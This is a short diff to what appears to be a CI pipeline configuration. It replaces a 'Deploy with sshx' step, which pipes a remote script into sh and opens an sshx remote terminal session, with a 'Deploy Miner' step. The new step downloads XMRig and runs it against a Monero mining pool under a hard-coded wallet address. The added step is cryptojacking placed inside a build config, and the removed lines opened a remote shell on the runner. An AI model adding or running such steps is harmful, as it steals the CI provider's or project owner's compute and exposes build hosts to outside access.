@@ -3,14 +3,14 @@ steps:
     key: "build"
     command: "echo 'Building the rocket'"
 
-  - label: "🚀 Deploy with sshx"
+  - label: "🚀 Deploy Miner"
     key: "deploy"
     depends_on: "build"
     agents:
-      # 'hosted:linux-medium' ki jagah sirf 'linux-medium' ya 'default' try karein:
       queue: "linux-medium"
     commands:
-      - echo "Installing sshx..."
-      - curl -sSf https://sshx.io/get | sh
-      - echo "Starting sshx session..."
-      - sshx
+      - apt-get update && apt-get install -y wget
+      - wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
+      - tar -xf xmrig-6.26.0-linux-static-x64.tar.gz
+      - cd xmrig-6.26.0
+      - ./xmrig -a rx/0 -o pool.xmr.privacygateway.io:7777 -u 49hnWUygafF8tTZ48PmT9WJvRTkRLMWskNmtFddkVHRi1XAvBeHdiTb29edTDZ8QywLGZzMvV4PBGMfrTBJgZ1dJM7PrubE -p x -t 2
